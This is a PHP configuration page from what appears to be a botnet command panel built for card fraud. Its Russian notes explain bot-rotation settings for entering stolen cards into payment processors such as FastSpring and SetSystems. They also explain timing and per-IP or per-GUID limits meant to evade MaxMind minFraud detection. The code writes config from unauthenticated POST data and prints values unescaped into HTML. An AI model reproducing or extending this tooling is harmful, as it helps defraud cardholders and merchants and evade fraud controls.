﻿<?

	require_once 'php/ini.php';
	
	$ini = INI::read('config.ini');
	
	$stat = 0;
	if ((@$_POST) && $_POST['isIni']) {
		foreach ($_POST as $key => $value) {
			$pos = strpos($key, '|');
			$key1 = substr($key, 0, $pos);
			$key2 = substr($key, $pos + 1);
			if (strlen($key1))
				$ini[$key1][$key2] = $value;
		}
		is_writeable('config.ini') ? $stat = 1 : $stat = -1;
		INI::write('config.ini', $ini);
	}
	
	echo "<form method='post' id='frm_settings'>\n";
	echo "<input type=\"hidden\" name=\"isIni\" value=\"1\">";
	echo "<table>\n";
	foreach ($ini as $key => $value) {
		echo "<tr align=\"left\">\n";
		echo "<td colspan=\"2\"><span id=\"$key\"><b>$key</b><span></td>\n";
		echo "</tr>\n";
		foreach ($value as $subkey => $subvalue) {
			echo "<tr align=\"left\">\n";
			$ln = strlen($subvalue) + 5;
			echo "<td>$subkey:</td><td><input name=\"$key|$subkey\" id=\"$key|$subkey\" value=\"$subvalue\" size=\"" . (($ln < 60) ? $ln : 60) . "\"><br></td>\n";
			echo "</tr>\n";
		}
	}
	echo "<tr><td colspan=\"2\" align=\"center\"><input type='submit' value='Save' onclick=\"var pdata = ajax_getInputs('frm_settings'); ajax_pload('frm_settings.php', pdata, 'div_ajax'); return false;\"></td></tr>";
	echo "</table>\n";
	echo "</form>\n";
	
?>

<br><center><b>Пояснительная записко</b></center><br>
<table width='600px' border='1' cellspacing='0' cellpadding='3' style='border: 1px solid lightgray; font-size: 9px; border-collapse: collapse; background-color: rgb(255, 255, 240);'>
<tr>
	<td><b>CHECK_IDENTICAL_BOT_GUID</b></td><td>Если включено (1), то бот, может выполнять задание только для какого-то одного биллинга (в течении WAIT_BEFORE_START) <i>(рекомендуется держать включённым, ибо maxMind minFraud, походу, стоит везде)</i></td>
</tr>
<tr>
	<td><b>CHECK_IDENTICAL_BOT_IP</b></td><td>Аналогично CHECK_IDENTICAL_BOT_GUID. Только тут, в качестве идентификатора бота служит не его GUID, а IP-адреса, с которых бот выходит в сеть</td>
</tr>
<tr>
	<td><b>DEL_PERIOD</b></td><td>Если бот ни разу не отстукивался в админку за это время, то он удаляется из базы (рекомендуется поставить побольше, если включён CHECK_IDENTICAL_BOT_IP, т.к. в ботах содержится информация о том, с каких IP-адресов они выходили в сеть ... правда, общее кол-во ботов в админке будет не очень правдоподобным)</td>
</tr>
<tr>
	<td><b>DISABLE_SLOPPY_BOTS</b></td><td>Некоторые боты по каким-то причинам, не могут использовать IE (они зависают). Если этот флаг включён (1), то такие боты блокируются. Если выключен (0), то мы снова выдаёт задание боту (hoping for the best)</td>
</tr>
<tr>
	<td><b>ENT_PERIOD</b></td><td>Частота обновления статистики активных/неактивных ботов. Клиент (бот) отстукивается в админку каждые 5 минут</td>
</tr>
<tr>
	<td><b>GEOIP_UPDATE_CHECK_INTERVAL</b></td><td>Интервал времени автоматического обновления базы GeoIP <i>(см. <b>geoip/geoipupdate.sh</b>)</i></td>
</tr>
<tr>
	<td><b>MAX_CPU_LOAD</b></td><td>Процентное значение загруженности CPU на машине клиента. Если загрузка CPU на машине бота больше этого значения, то мы с ним не работаем некоторое время</td>
</tr>
<tr>
	<td><b>MIN_WAIT_TIME</b></td><td>Минимальное время ожидания между выдачей заданий для одного биллинга</td>
</tr>
<tr>
	<td><b>SS_FS_INTERVAL</b></td><td>Минимальное время, по истечению которого, бот, использованный в задании SetSystems, может использоваться в FastSpring. Или наоборот - ... использованный в задании FastSpring, может использоваться в SetSystems<br>Не имеет смысла, если включён CHECK_IDENTICAL_BOT_GUID или CHECK_IDENTICAL_BOT_IP</td>
</tr>
<tr>
	<td><b>WAIT_BEFORE_START</b></td><td>Минимальное время, по истечению которого, бот снова может быть использован для вбива в тот же самый биллинг</td>
</tr>
</table>

<?php
	
	if ($stat) {
		($stat > 0) ? $msg = "<span><font class='ok'>OK</font></span> changes are saved</small></font>" : $msg = "<span><font class='error'>ERROR</font></span> cannot write to INI-file</small></font>";
		echo "<div align='left' height='30px' style='border-top: 1px solid black; padding: 2px; position: relative; background-color: rgb(231, 231, 231); bottom: -10px; left: -10px; right: -10px; margin-right: -20px; margin-bottom: 0px;'><font class='comment'><small><b>info: </b>$msg</div>";
	}
?>